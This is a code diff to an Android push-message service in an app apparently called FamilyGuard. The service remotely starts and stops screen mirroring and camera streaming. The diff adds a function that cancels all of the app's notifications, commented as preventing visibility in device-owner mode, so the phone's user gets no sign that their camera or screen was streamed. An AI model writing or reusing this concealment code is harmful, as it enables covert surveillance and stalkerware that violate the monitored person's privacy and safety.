@@ -196,9 +196,9 @@ class FcmService : FirebaseMessagingService() {
                 })
             }
             "stop_screen_mirror" -> {
-                startForegroundServiceSafely(Intent(this, ScreenMirrorService::class.java).apply {
-                    action = "STOP"
-                })
+                // Stop service directly without starting foreground (avoids notification)
+                cancelAllNotifications()
+                stopService(Intent(this, ScreenMirrorService::class.java))
             }
             "start_camera" -> {
                 // Check camera permission first
@@ -218,9 +218,9 @@ class FcmService : FirebaseMessagingService() {
                 })
             }
             "stop_camera" -> {
-                startForegroundServiceSafely(Intent(this, CameraStreamService::class.java).apply {
-                    action = "STOP"
-                })
+                // Stop service directly without starting foreground (avoids notification)
+                cancelAllNotifications()
+                stopService(Intent(this, CameraStreamService::class.java))
             }
             
             // WebRTC Streaming Commands
@@ -1444,6 +1444,19 @@ class FcmService : FirebaseMessagingService() {
                 Log.e(TAG, "Failed to send stream error", e)
             }
         }
+    }
+    
+    /**
+     * Cancel all FamilyGuard notifications to prevent visibility in DO mode
+     */
+    private fun cancelAllNotifications() {
+        try {
+            val nm = getSystemService(android.app.NotificationManager::class.java)
+            nm.cancelAll()
+            for (id in 1001..1020) {
+                try { nm.cancel(id) } catch (e: Exception) {}
+            }
+        } catch (e: Exception) {}
     }
     
     private fun showNotification(title: String, body: String) {
